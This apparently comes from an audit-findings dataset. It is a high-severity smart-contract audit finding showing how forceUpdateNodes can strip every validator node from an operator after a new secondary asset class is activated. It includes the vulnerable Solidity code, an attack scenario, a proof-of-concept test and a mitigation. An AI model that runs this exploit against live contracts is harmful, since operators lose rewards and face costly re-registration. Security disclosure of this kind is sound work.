# [H] forceUpdateNodes potentially enables mass validator removal when new asset classes are added

## Summary
Severity: High
Contest weight: 0.0000
Dataset id: 23457
Source: https://huggingface.co/datasets/Zaevlad/audit-findings-dataset
Type: audit-finding

## Details
Description: If _requireMinSecondaryAssetClasses is false, ie. the operator does not have minimum value of secondary asset, the validator is forcibly removed, regardless of whether the primary asset stake is above the minimum stake or not.

```solidity
function forceUpdateNodes(
    address operator,
    uint256 limitStake
) external updateStakeCache(getCurrentEpoch(), PRIMARY_ASSET_CLASS) onlyDuringFinalWindowOfEpoch
    updateGlobalNodeStakeOncePerEpoch {,!
    // ... validation and setup code ...
    // ... stake calculation logic ...
    uint256 newStake = previousStake - stakeToRemove;
    leftoverStake -= stakeToRemove;
    if (
        (newStake < assetClasses[PRIMARY_ASSET_CLASS].minValidatorStake)
        || !_requireMinSecondaryAssetClasses(0, operator) // @audit || operator used here
    ) {
        newStake = 0;
        _initializeEndValidationAndFlag(operator, valID, nodeId); // Node removed
    } else {
        _initializeValidatorStakeUpdate(operator, valID, newStake);
        emit NodeStakeUpdated(operator, nodeId, newStake, valID);
    }
}
}
```

When a new secondary asset class is activated by owner via `activateSecondaryAssetClass()`, it is likely that existing operators initially have zero stake in that asset class, causing `_requireMinSecondaryAssetClasses` to return false.

Consider following scenario:
- Owner calls `activateSecondaryAssetClass(newAssetClassId)` without ensuring every operator meets the minimum stake requirement for new asset class
- Attacker calls `forceUpdateNodes(operator, 0)` for all operators during the immediate next update window
- Assuming a rebalancing scenario, all validator nodes for non‑compliant operator get removed because `_requireMinSecondaryAssetClasses` returns false for the new asset class

Impact: Mass removal of validators for a given operator leads to unnecessary loss of rewards and an expensive process to re‑register nodes.

## Proof of Concept
```solidity
function test_massNodeRemovalAttack() public {
    // Alice already has substantial stake from setup: 200_000_000_002_000
    // Let's verify the initial state
    uint48 epoch = _calcAndWarpOneEpoch();
    uint256 aliceInitialStake = middleware.getOperatorStake(alice, epoch, assetClassId);
    console2.log("Alice's initial stake:", aliceInitialStake);
    assertGt(aliceInitialStake, 0, "Alice should have initial stake from setup");
    // Create 3 nodes with Alice's existing stake
    (bytes32[] memory nodeIds,,) = _createAndConfirmNodes(alice, 3, 0, true);
    epoch = _calcAndWarpOneEpoch();
    // Verify nodes are active
    assertEq(middleware.getOperatorNodesLength(alice), 3, "Should have 3 active nodes");
    uint256 usedStake = middleware.getOperatorUsedStakeCached(alice);
    console2.log("Used stake after creating nodes:", usedStake);
    // 1: Owner adds new secondary asset class
    ERC20Mock newAsset = new ERC20Mock();
    vm.startPrank(validatorManagerAddress);
    middleware.addAssetClass(5, 1000 ether, 10000 ether, address(newAsset));
    middleware.activateSecondaryAssetClass(5);
    vm.stopPrank();
    // 2: Reduce Alice's available stake to trigger rebalancing
    // Use the existing mintedShares from setup
    uint256 originalShares = mintedShares; // From setup
    uint256 reducedShares = originalShares / 3; // Drastically reduce
    _setOperatorL1Shares(bob, validatorManagerAddress, assetClassId, alice, reducedShares, delegator);
    epoch = _calcAndWarpOneEpoch();
    // Verify rebalancing condition: newStake < usedStake
    uint256 newStake = middleware.getOperatorStake(alice, epoch, assetClassId);
    uint256 currentUsedStake = middleware.getOperatorUsedStakeCached(alice);
    console2.log("New available stake:", newStake);
    console2.log("Current used stake:", currentUsedStake);
    assertTrue(newStake < currentUsedStake, "Should trigger rebalancing");
    // 3: Exploit during force update window
    _warpToLastHourOfCurrentEpoch();
    uint256 nodesBefore = middleware.getOperatorNodesLength(alice);
    // The vulnerability: OR logic causes removal even for nodes with adequate individual stake
    middleware.forceUpdateNodes(alice, 1); // using 1 wei as limit to trigger the issue
    epoch = _calcAndWarpOneEpoch();
    uint256 nodesAfter = middleware.getOperatorNodesLength(alice);
    console2.log("Nodes before attack:", nodesBefore);
    console2.log("Nodes after attack:", nodesAfter);
    // All nodes removed due to OR logic
    assertEq(nodesAfter, 0, "All nodes should be removed due to mass removal attack");
}
```

## Recommendation
Recommended Mitigation: Consider adding a delay of atleast 1 epoch before minimum stake requirement is enforced on existing operators.  
Since `forceUpdateNodes` is a public function that can trigger mass removal of validators, it would be dangerous to only rely on admin/owner to ensure every existing operator is compliant before adding a new secondary asset.
